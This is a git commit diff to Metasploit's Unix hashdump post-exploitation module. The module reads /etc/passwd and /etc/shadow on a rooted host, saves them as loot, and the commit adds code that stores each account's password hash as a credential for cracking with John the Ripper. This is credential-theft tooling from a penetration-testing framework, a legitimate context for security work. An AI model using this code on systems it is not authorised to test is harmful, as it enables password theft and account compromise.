478029e9bd653a27c810596b77a5b02ea84f4e6f
James Lee <egypt@metasploit.com>
2015-04-04 02:17:39 -0500

    Only store creds for accounts with a password

--- modules/post/unix/gather/hashdump.rb
+++ modules/post/unix/gather/hashdump.rb
@@ -30,16 +30,29 @@ class Metasploit3 < Msf::Post
   # Run Method for when run command is issued
   def run
     if is_root?
-      passwd_file = getent_passwd
-      shadow_file = getent_shadow
+      passwd_data = getent_passwd
+      shadow_data = getent_shadow
 
       # Save in loot the passwd and shadow file
-      store_loot("unix.shadow", "text/plain", session, shadow_file, "shadow.txt", "Unix Password Shadow File")
-      store_loot("unix.passwd", "text/plain", session, passwd_file, "passwd.txt", "Unix Passwd File")
+      store_loot("unix.shadow", "text/plain", session, shadow_data, "shadow.txt", "Unix Password Shadow File")
+      store_loot("unix.passwd", "text/plain", session, passwd_data, "passwd.txt", "Unix Passwd File")
 
       # Unshadow the files
-      john_file = unshadow(passwd_file, shadow_file)
+      john_file = unshadow(passwd_data, shadow_data)
       john_file.each_line do |l|
+        hash_parts = l.split(':')
+
+        credential_data = {
+          jtr_format: 'md5,des,bsdi,crypt',
+          origin_type: :session,
+          post_reference_name: self.refname,
+          private_type: :nonreplayable_hash,
+          private_data: hash_parts[1],
+          session_id: session_db_id,
+          username: hash_parts[0],
+          workspace_id: myworkspace_id
+        }
+        create_credential(credential_data)
         print_good(l.chomp)
       end
       # Save pwd file
@@ -52,21 +65,29 @@ class Metasploit3 < Msf::Post
 
   end
 
+  # Combine passwd + shadow for consumption by JtR, keeping only those
+  # accounts that have passwords
+  #
+  # @param passwd_data [String] contents of /etc/passwd or equivalent
+  # @param shadow_data [String] contents of /etc/shadow or equivalent
+  # @return [String] all accounts with passwords
   def unshadow(passwd_data, shadow_data)
-    unshadowed = passwd_data.dup
-    shadow_lines = shadow_data.split("\n")
+    unshadowed = ""
+    shadow_lines = shadow_data.lines.map { |line| line.split(':', 3) }
 
     passwd_data.each_line do |passwd_line|
-      shadow_lines.find do |shadow_line|
-        user,hash,_ = shadow_line.split(':', 3)
-        if hash !~ /^(?:\*$|!)/
-          # replace an 'x' preceded by the username and succeeded by a colon
-          # with the captured hash; e.g. this:
-          #    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
-          # into this:
-          #    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
-          unshadowed.sub!(/(?<=^#{user}:)x(?=:)/m, hash)
-        end
+      user, _= passwd_line.split(':', 2)
+
+      _, hash, _ = shadow_lines.find { |line| line.first == user }
+
+      # Don't bother with locked/disabled accounts
+      if hash !~ /^(?:\*$|!)/
+        # Replace an 'x' preceded by the username and succeeded by a colon,
+        # with the captured hash; e.g. this:
+        #    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+        # into this:
+        #    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+        unshadowed << passwd_line.sub(/(?<=^#{user}:)x(?=:)/, hash)
       end
     end
 
